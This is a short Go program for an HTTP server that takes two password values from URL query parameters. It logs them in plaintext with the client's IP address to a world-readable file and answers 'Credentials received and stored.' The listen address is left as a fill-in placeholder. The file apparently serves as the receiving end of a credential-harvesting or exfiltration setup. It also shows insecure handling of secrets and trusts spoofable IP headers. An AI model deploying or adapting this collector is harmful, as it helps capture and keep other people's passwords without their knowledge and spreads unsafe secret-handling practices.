package main

import (
    "fmt"
    "log"
    "net/http"
    "os"
    "strings"
    "time"
)

const logFile = "server_data.txt"

func getClientIP(r *http.Request) string {
    forwarded := r.Header.Get("X-Forwarded-For")
    if forwarded != "" {
        return strings.Split(forwarded, ",")[0]
    }

    realIP := r.Header.Get("X-Real-IP")
    if realIP != "" {
        return realIP
    }

    return strings.Split(r.RemoteAddr, ":")[0]
}

func logRequest(r *http.Request, password1, password2 string) {
    clientIP := getClientIP(r)
    logLine := fmt.Sprintf(
        "%s - IP: %s - Method: %s - Password1: %s - Password2: %s\n",
        time.Now().Format(time.RFC3339),
        clientIP,
        r.Method,
        password1,
        password2,
    )

    f, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        log.Println("Error opening log file:", err)
        return
    }
    defer f.Close()

    if _, err := f.WriteString(logLine); err != nil {
        log.Println("Error writing to log file:", err)
    }
}

func handleRequest(w http.ResponseWriter, r *http.Request) {
    password1 := r.URL.Query().Get("password1")
    password2 := r.URL.Query().Get("password2")

    logRequest(r, password1, password2)

    w.WriteHeader(http.StatusOK)
    w.Write([]byte("Credentials received and stored.\n"))
}

func main() {
    http.HandleFunc("/", handleRequest)
    log.Println("Starting server on :8080...")

    http.HandleFunc("/debug", func(w http.ResponseWriter, r *http.Request) {
        ip := getClientIP(r)
        fmt.Fprintf(w, "RemoteAddr: %s\n", r.RemoteAddr)
        fmt.Fprintf(w, "IP Capturada: %s\n", ip)
    })

    if err := http.ListenAndServe("<YOUR_IP_ADDRESS>:<YOUR_PORT>", nil); err != nil {
        log.Fatal("ListenAndServe: ", err)
    }
}
